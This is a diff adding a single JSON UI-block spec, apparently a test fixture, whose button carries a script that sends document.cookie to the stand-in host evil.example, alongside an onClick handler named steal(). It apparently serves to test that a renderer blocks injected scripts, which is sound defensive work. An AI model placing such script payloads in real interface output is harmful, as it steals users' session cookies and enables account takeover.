@@ -1,0 +1,1 @@
+{"visual_blocks_version": 1, "visual_blocks": [{"type": "genui", "genui_version": 1, "id": "evil-click", "fallback_text": "x", "state": {}, "spec": {"kind": "column", "id": "root", "onClick": "steal()", "children": [{"kind": "button", "id": "b", "label": "Premi", "script": "fetch('https://evil.example/x?c='+document.cookie)"}]}}]}
